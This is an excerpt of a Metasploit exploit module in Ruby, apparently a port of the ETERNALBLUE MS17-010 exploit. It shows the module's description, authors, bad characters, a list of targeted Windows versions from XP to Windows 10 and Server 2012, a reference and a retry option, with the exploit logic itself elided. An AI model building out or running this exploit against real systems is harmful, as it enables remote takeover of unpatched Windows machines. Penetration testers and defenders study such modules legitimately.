...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def initialize(info = {})
    super(update_info(info,
      ...
      'Description' => %q{
        This module is a port of the ETERNALBLUE Exploit by the Shadow Brokers, made
        compatible with win7-win10. Thanks to Worawit Wang and cclauss.
        This exploit was found on ExploitDB by sleepya.
      ...
      'Author'      =>
        [
          ...
          'Shadow Brokers',
          'thelightcosine',
          'Pascal3366 (https://github.com/Pascal3366)'  # Author of this Port
        ],
		  'Payload'        =>
        {
          'BadChars'   => "\x00\x01",
          ...
          ['Windows 10 Pro Build 10240 x64',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              'os_patterns'    => ['Windows 10 Pro Build 10240']
            }
          ],
          ['Windows 10 Pro x64',
            {
          ...
          ['Windows 10 Enterprise x64',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              'os_patterns'    => ['Windows 10 Enterprise']
            }
          ],
          ['Windows 10 Education x64',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              'os_patterns'    => ['Windows 10 Education']
            }
          ],
          ['Windows 2012 R2 x64',
            {
          ...
          ['Windows 2008 R2 SP1 x64',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              'os_patterns'    => ['Windows 2008 R2 SP1']
            }
          ],
          ['Windows 7 SP1 x64',
            {
          ...
          ['Windows 2003 R2 SP2 x64',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              'os_patterns'    => ['Windows 2003 R2 SP2']
            }
          ],
          ['Windows XP SP2 x64',
            {
      ...
      'References'     =>
        [
          ...
          [ 'URL', 'https://github.com/Pascal3366/MS17-010-EternalBlue-WinXP-Win10' ],
        ],
        'Privileged'     => true,
		)
  ...
  register_options(
      [
        ...
        OptInt.new( 'MaxExploitAttempts', [ true,  "The number of times to retry the exploit.", 5 ] ),
